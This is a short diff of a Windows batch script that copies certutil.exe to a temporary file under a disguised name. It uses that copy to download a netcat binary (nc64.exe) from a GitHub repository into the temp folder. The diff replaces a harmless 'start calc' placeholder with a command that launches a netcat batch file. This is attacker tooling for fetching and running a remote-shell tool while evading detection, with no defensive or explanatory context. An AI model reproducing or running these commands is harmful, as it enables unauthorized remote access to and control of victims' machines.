@@ -1,7 +1,7 @@
 @echo on
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-start calc
+start %temp%\nc.bat
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
 
